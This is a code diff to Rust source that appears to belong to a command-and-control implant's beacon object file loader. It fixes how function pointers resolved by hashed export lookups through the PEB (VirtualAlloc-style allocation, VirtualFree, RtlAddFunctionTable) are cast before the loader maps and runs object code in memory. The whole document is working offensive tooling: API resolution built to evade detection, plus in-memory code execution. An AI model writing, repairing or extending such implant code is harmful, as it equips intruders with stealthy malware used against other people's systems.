@@ -420,7 +420,10 @@ unsafe fn resolve_external(instance: &Instance, name: &[u8]) -> Option<usize> {
         if load.is_null() {
             return None;
         }
-        let load = *(load as *const unsafe extern "system" fn(*const u8) -> *mut c_void);
+        let load = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(*const u8) -> *mut c_void,
+        >(load as *const core::ffi::c_void);
         handle = load(dll.as_ptr());
         if handle.is_null() {
             return None;
@@ -632,7 +635,10 @@ unsafe fn load_and_run(instance: &mut Instance, task: &BofTask) -> Result<(), Lo
     if va.is_null() {
         return Err(LoadError::simple(transport::BOF_ERROR_ALLOC));
     }
-    let va = *(va as *const unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void);
+    let va = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void,
+    >(va as *const core::ffi::c_void);
     let base = va(
         core::ptr::null_mut(),
         total,
@@ -647,7 +653,10 @@ unsafe fn load_and_run(instance: &mut Instance, task: &BofTask) -> Result<(), Lo
     if result.is_err() {
         let vf = peb::find_export(instance.kernel32, H_VIRTUAL_FREE);
         if !vf.is_null() {
-            let vf = *(vf as *const unsafe extern "system" fn(*mut c_void, usize, u32) -> i32);
+            let vf = core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(*mut c_void, usize, u32) -> i32,
+            >(vf as *const core::ffi::c_void);
             vf(base as *mut c_void, 0, MEM_RELEASE);
         }
     }
@@ -811,7 +820,10 @@ unsafe fn load_into(
     if !pdata_base.is_null() && pdata_count > 0 {
         let add = peb::find_export(instance.ntdll, H_RTL_ADD_FUNCTION_TABLE);
         if !add.is_null() {
-            let add = *(add as *const unsafe extern "system" fn(*mut c_void, u32, u64) -> i32);
+            let add = core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(*mut c_void, u32, u64) -> i32,
+            >(add as *const core::ffi::c_void);
             add(pdata_base, pdata_count, base as u64);
             func_table = true;
         }
@@ -824,7 +836,10 @@ unsafe fn load_into(
     if func_table {
         let del = peb::find_export(instance.ntdll, H_RTL_DELETE_FUNCTION_TABLE);
         if !del.is_null() {
-            let del = *(del as *const unsafe extern "system" fn(*mut c_void) -> i32);
+            let del = core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(*mut c_void) -> i32,
+            >(del as *const core::ffi::c_void);
             del(pdata_base);
         }
     }
